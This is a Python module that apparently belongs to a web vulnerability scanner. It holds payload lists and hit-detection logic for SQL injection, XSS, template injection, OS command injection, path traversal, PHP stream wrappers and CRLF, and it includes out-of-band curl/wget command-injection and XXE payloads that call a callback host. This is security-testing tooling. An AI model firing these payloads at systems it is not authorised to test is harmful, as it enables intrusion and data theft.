"""
Payload library + detection for Yggdrasil's deep parameter fuzzer.

Encodes the payload sets and the 'tells' a penetration tester / bug-bounty hunter
watches for, per vulnerability class and sub-type:
  - SQL injection: error-based, boolean-based blind, time-based blind
  - XSS: reflected (multiple contexts) and stored/persistent (engine-driven)
  - SSTI: server-side template evaluation across several engines
  - OS command injection: Unix in-band + Unix/Windows time-based blind
  - Path traversal / LFI: file read + PHP stream wrappers
  - CRLF / HTTP response splitting
Pure and deterministic — Tyr owns transport; this module owns *what to send* and
*how to recognise a hit*.

Every payload is a NON-DESTRUCTIVE detection probe: it triggers an error, reflects
a unique canary, evaluates arithmetic, reads a world-readable file, or runs a
benign `id`/`sleep`/`whoami`/`ping`. Nothing here writes, deletes, drops, or
persists data of consequence. For use only against targets you are authorized to test.
"""
import re
from difflib import SequenceMatcher

# Unique markers — chosen so a natural page is astronomically unlikely to contain
# them, making reflection/evaluation unambiguous.
CANARY = "yggf9x27"          # generic reflection canary
SSTI_EXPECT = "1763"         # == 41*43; if the response contains it, math was evaluated
CMD_RE = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+")   # output of unix `id`
PHP_SRC_B64 = "PD9waHA"      # base64 of "<?php" — php://filter source leak signature

# ── payload sets ─────────────────────────────────────────────────
SQLI_ERROR = [
    "'", "\"", "')", "';", "\"))", "`",
    "' OR '1'='1", "' OR 1=1-- -", "\" OR \"1\"=\"1",
    "1' ORDER BY 99-- -", "' UNION SELECT NULL-- -", "%27",
]
# boolean-based blind: (TRUE payload, FALSE payload). TRUE should mirror the benign
# page; FALSE should diverge. String- and numeric-context variants.
SQLI_BOOL_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
]
SQLI_TIME = [
    "' OR SLEEP(6)-- -", "\"||(SELECT SLEEP(6))||\"",
    "'||pg_sleep(6)--", "');SELECT pg_sleep(6)--",
    "1)) OR SLEEP(6)#", "1' WAITFOR DELAY '0:0:6'-- -",
]
# reflected XSS across contexts: tag-injection, attribute-breakout, JS-string, URI.
XSS = [
    f"<{CANARY}>", f"\"><{CANARY}>", f"'><{CANARY}>",
    f"<img src=x onerror={CANARY}>", f"<svg onload={CANARY}>",
    f"\"><script>{CANARY}</script>", f"<iframe src=javascript:{CANARY}>",
    f"<details open ontoggle={CANARY}>", f"<body onload={CANARY}>",
    f"\" autofocus onfocus={CANARY} x=\"", f"' onmouseover={CANARY} '",
    f"';{CANARY}//", f"\\\";{CANARY}//", f"javascript:{CANARY}",
]
SSTI = [
    "${41*43}", "#{41*43}", "{{41*43}}", "<%= 41*43 %>", "${{41*43}}",
    "{41*43}", "@(41*43)", "*{41*43}", "#set($x=41*43)${x}", "{{=41*43}}",
    "{{'41'*43}}", "~{41*43}",
]
CMDI = [
    ";id", "|id", "||id", "&&id", "`id`", "$(id)", "%0aid", "; id #", "&id", "'|id;'",
]
# time-based blind: Unix (sleep) + Windows (ping -n / timeout) — one delay detector.
CMDI_TIME = [
    ";sleep 6", "|sleep 6", "$(sleep 6)", "`sleep 6`", "&& sleep 6",
    "& ping -n 6 127.0.0.1", "| ping -n 6 127.0.0.1", "&& timeout /t 6",
]
TRAVERSAL = [
    "../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd", "/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..\\..\\..\\..\\windows\\win.ini",
    "..%c0%af..%c0%afetc/passwd", "../../../../etc/passwd%00",
]
# LFI via PHP stream wrappers — source disclosure and, where enabled, code exec.
LFI_WRAPPER = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgZWNobyg0MSo0Myk7Pz4=",   # <?php echo(41*43);?>
    "expect://id",
]
CRLF = [f"%0d%0aX-Ygg-Inj:{CANARY}", f"%0aX-Ygg-Inj:{CANARY}",
        f"%E5%98%8a%E5%98%8dX-Ygg-Inj:{CANARY}"]

# UNION-based SQLi: recover data through an appended UNION SELECT of a unique marker
# across column counts. A hit means the marker came back as a *row* (extraction),
# not raw reflection (hence the "payload not reflected" guard in evaluate()).
UNION_MARKER = "yggu9k3mark"
SQLI_UNION = [
    f"' UNION SELECT '{UNION_MARKER}'-- -",
    f"' UNION SELECT '{UNION_MARKER}',NULL-- -",
    f"' UNION SELECT NULL,'{UNION_MARKER}'-- -",
    f"' UNION SELECT '{UNION_MARKER}',NULL,NULL-- -",
    f"' UNION SELECT NULL,'{UNION_MARKER}',NULL-- -",
    f"-1' UNION SELECT '{UNION_MARKER}'-- -",
    f"') UNION SELECT '{UNION_MARKER}'-- -",
]

# DOM XSS: execution-proving payloads for the headless-browser pass. Each calls
# alert(DOM_MARKER); a fired dialog carrying the marker proves JavaScript executed
# (catches DOM-only sinks that never appear in the server response).
DOM_MARKER = "yggdom5150"


def dom_payloads():
    m = DOM_MARKER
    return [
        f'"><img src=x onerror=alert("{m}")>',
        f'<img src=x onerror=alert("{m}")>',
        f'<svg onload=alert("{m}")>',
        f'<img src=x onerror=alert`{m}`>',
        f"javascript:alert('{m}')",
        f"';alert('{m}')//",
        f'"-alert("{m}")-"',
        f'</script><script>alert("{m}")</script>',
    ]


def oob_payloads(callback_url: str):
    """Out-of-band (OAST) payloads that make a vulnerable target reach out to our
    listener at `callback_url` — confirming blind SSRF / command injection / XXE that
    produce no visible response. Non-destructive (a GET to our own URL)."""
    return {
        "ssrf": [callback_url],
        "cmdi": [f";curl {callback_url}", f"|curl {callback_url}", f"$(curl {callback_url})",
                 f"`curl {callback_url}`", f"& curl {callback_url}", f";wget -qO- {callback_url}"],
        "xxe": [f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{callback_url}">]><r>&x;</r>'],
    }

SQL_ERROR_SIGNATURES = (
    "sql syntax", "mysql_fetch", "you have an error in your sql", "ora-0",
    "psql:", "sqlite", "sqlstate", "pdoexception", "microsoft ole db", "odbc",
    "unterminated", "quoted string not properly terminated", "syntax error at or near",
    "unclosed quotation mark", "pg::", "sqlalchemy.exc", "warning: mysqli",
    "supplied argument is not a valid mysql", "conversion failed",
)

# family -> (severity, cvss, remediation, description)
_META = {
    "sqli_error":  ("high", 8.2, "Use parameterized queries / prepared statements; never build SQL from input.",
                    "A crafted value provoked a database error, proving the parameter is concatenated into a SQL query — an attacker can read or modify the database."),
    "sqli_bool":   ("high", 8.2, "Use parameterized queries; the parameter alters query logic.",
                    "A boolean SQL condition changed the response deterministically (TRUE mirrored the page, FALSE diverged), confirming blind SQL injection — data can be extracted a bit at a time."),
    "sqli_time":   ("high", 8.6, "Use parameterized queries; the parameter reaches the SQL engine unfiltered.",
                    "A time-delay payload made the response hang, confirming blind SQL injection: the parameter reaches the SQL engine and an attacker can extract data by timing."),
    "sqli_union":  ("critical", 9.1, "Use parameterized queries; the parameter is concatenated into a UNION-able query.",
                    "An appended UNION SELECT returned attacker-chosen data as a result row, confirming UNION-based SQL injection with direct data extraction."),
    "dom_xss":     ("high", 7.7, "Sanitize/encode before writing to DOM sinks (innerHTML, document.write, eval); apply a strict CSP.",
                    "A payload executed JavaScript in a headless browser, confirming XSS with real execution (including DOM-based sinks that never appear in the server response)."),
    "oob_ssrf":    ("high", 8.6, "Allowlist outbound hosts/schemes; block internal/link-local addresses; resolve+validate before fetch.",
                    "A parameter caused the server to make an out-of-band request to our listener, confirming blind server-side request forgery."),
    "oob_cmdi":    ("critical", 9.8, "Never pass input to a shell; use exec with an argument array and an allowlist.",
                    "An injected shell command reached our out-of-band listener, confirming blind OS command injection with no visible output."),
    "xss":         ("high", 7.4, "Context-aware output encoding + a strict Content-Security-Policy.",
                    "An injected HTML/script payload was reflected unencoded, letting an attacker run arbitrary JavaScript in a victim's browser (session theft, credential harvesting)."),
    "stored_xss":  ("high", 8.0, "Encode on output everywhere the value renders; apply a strict CSP.",
                    "An injected payload was stored server-side and later reflected unencoded on another response, confirming stored XSS — it fires for every visitor who loads the affected page."),
    "ssti":        ("critical", 9.4, "Never render user input as a template; sandbox the engine / use logic-less templates.",
                    "A template expression was evaluated server-side (math executed), confirming server-side template injection — frequently a path to remote code execution."),
    "cmdi":        ("critical", 9.8, "Never pass input to a shell; use exec with an argument array and an allowlist.",
                    "Injected shell syntax executed the `id` command on the server, confirming OS command injection — full server compromise is likely."),
    "cmdi_time":   ("critical", 9.8, "Never pass input to a shell; the parameter reaches OS command execution.",
                    "A shell time-delay payload (sleep/ping/timeout) made the response hang, confirming blind OS command injection on Unix or Windows."),
    "traversal":   ("high", 7.5, "Canonicalize and allowlist paths; never build filesystem paths from input.",
                    "A directory-traversal payload returned the contents of a system file, confirming arbitrary file read."),
    "lfi_wrapper": ("high", 8.1, "Disable dangerous PHP wrappers (php://, data://, expect://); allowlist file access.",
                    "A PHP stream wrapper returned application source code or executed input, confirming local file inclusion / code exposure."),
    "crlf":        ("high", 6.5, "Strip CR/LF from any input reflected into response headers.",
                    "A CR/LF payload injected a new response header, enabling response splitting, cache poisoning, or header-based attacks."),
}


def family_description(family: str) -> str:
    meta = _META.get(family)
    return meta[3] if meta else ""


def _v(family, title, evidence):
    sev, cvss, rem, desc = _META[family]
    return {"family": family, "title": title, "severity": sev, "cvss": cvss,
            "evidence": evidence, "remediation": rem, "description": desc}


def probe_families(include_time: bool = True):
    """The (family, payload) plan a full per-parameter sweep fires. Fast, single-
    request detectors first; the slow time-based blind probes last (and optional).
    Boolean-based blind and stored XSS are multi-request and driven by the engine."""
    plan = []
    for p in SQLI_ERROR:   plan.append(("sqli_error", p))
    for p in SQLI_UNION:   plan.append(("sqli_union", p))
    for p in XSS:          plan.append(("xss", p))
    for p in SSTI:         plan.append(("ssti", p))
    for p in CMDI:         plan.append(("cmdi", p))
    for p in TRAVERSAL:    plan.append(("traversal", p))
    for p in LFI_WRAPPER:  plan.append(("lfi_wrapper", p))
    for p in CRLF:         plan.append(("crlf", p))
    if include_time:
        for p in SQLI_TIME:  plan.append(("sqli_time", p))
        for p in CMDI_TIME:  plan.append(("cmdi_time", p))
    return plan


def _similarity(a: str, b: str) -> float:
    a = re.sub(r"\s+", " ", a or "")[:8000]
    b = re.sub(r"\s+", " ", b or "")[:8000]
    if not a and not b:
        return 1.0
    return SequenceMatcher(None, a, b).ratio()


def boolean_verdict(base_text, true_text, false_text,
                    base_status=200, true_status=200, false_status=200):
    """Boolean-based blind SQLi: a TRUE injected condition mirrors the benign page,
    a FALSE one diverges. Differential over three responses to avoid false positives."""
    st = _similarity(base_text, true_text)
    sf = _similarity(base_text, false_text)
    stf = _similarity(true_text, false_text)
    if st >= 0.95 and sf <= 0.90 and stf <= 0.90 and (st - sf) >= 0.10:
        return _v("sqli_bool", "SQL Injection (boolean-based blind)",
                  f"TRUE condition matched baseline (similarity {st:.2f}); FALSE diverged ({sf:.2f})")
    return None


def evaluate(family, payload, resp_text, status=200, elapsed=None, resp_headers=None,
             base_text="", base_status=200, base_elapsed=None):
    """Return a verdict dict for a confirmed single-request hit, else None. Detection
    is differential where it can be (signature present in the probe response but not
    the benign baseline; timing delta over baseline) to cut false positives."""
    text = resp_text or ""
    low = text.lower()
    base_low = (base_text or "").lower()

    if family == "sqli_error":
        hit = next((s for s in SQL_ERROR_SIGNATURES if s in low and s not in base_low), None)
        if hit:
            return _v("sqli_error", "SQL Injection (error-based)",
                      f"DB error signature '{hit}' returned for payload {payload!r} (HTTP {status})")

    elif family == "sqli_time":
        if elapsed is not None and base_elapsed is not None and elapsed >= 5.0 and (elapsed - base_elapsed) >= 4.0:
            return _v("sqli_time", "SQL Injection (time-based blind)",
                      f"Response delayed {elapsed:.1f}s vs {base_elapsed:.1f}s baseline for {payload!r}")

    elif family == "sqli_union":
        if UNION_MARKER in text and UNION_MARKER not in base_low and payload not in text:
            return _v("sqli_union", "SQL Injection (UNION-based, data extraction)",
                      f"UNION SELECT returned the marker as a data row for {payload!r} (HTTP {status})")

    elif family == "xss":
        trig = ("<" in payload or "javascript:" in payload or re.search(r"on\w+=", payload))
        if trig and payload in text:
            return _v("xss", "Reflected XSS (unencoded payload reflected)",
                      f"Payload reflected verbatim in the response body: {payload!r} (HTTP {status})")

    elif family == "ssti":
        if SSTI_EXPECT in low and SSTI_EXPECT not in base_low and payload not in text:
            return _v("ssti", "Server-Side Template Injection",
                      f"Template expression evaluated: {payload!r} produced {SSTI_EXPECT} in the response")

    elif family == "cmdi":
        if CMD_RE.search(text) and not CMD_RE.search(base_text or ""):
            return _v("cmdi", "OS Command Injection",
                      f"`id` output returned for payload {payload!r} (HTTP {status})")

    elif family == "cmdi_time":
        if elapsed is not None and base_elapsed is not None and elapsed >= 5.0 and (elapsed - base_elapsed) >= 4.0:
            return _v("cmdi_time", "OS Command Injection (time-based blind)",
                      f"Response delayed {elapsed:.1f}s vs {base_elapsed:.1f}s baseline for {payload!r}")

    elif family == "traversal":
        if (re.search(r"root:.*?:0:0:", text) or "[extensions]" in low or "[fonts]" in low) \
                and not re.search(r"root:.*?:0:0:", base_text or ""):
            return _v("traversal", "Path Traversal / LFI (file read)",
                      f"System file contents returned for payload {payload!r} (HTTP {status})")

    elif family == "lfi_wrapper":
        if (PHP_SRC_B64 in text or (SSTI_EXPECT in low and SSTI_EXPECT not in base_low)) \
                and PHP_SRC_B64 not in (base_text or ""):
            return _v("lfi_wrapper", "Local File Inclusion (PHP stream wrapper)",
                      f"PHP wrapper leaked source / executed code for payload {payload!r}")

    elif family == "crlf":
        blob = " ".join(f"{k}: {v}" for k, v in (resp_headers or {}).items()).lower().replace(" ", "")
        if f"x-ygg-inj:{CANARY}" in blob:
            return _v("crlf", "CRLF Injection / HTTP Response Splitting",
                      f"Injected header reflected via payload {payload!r}")

    return None
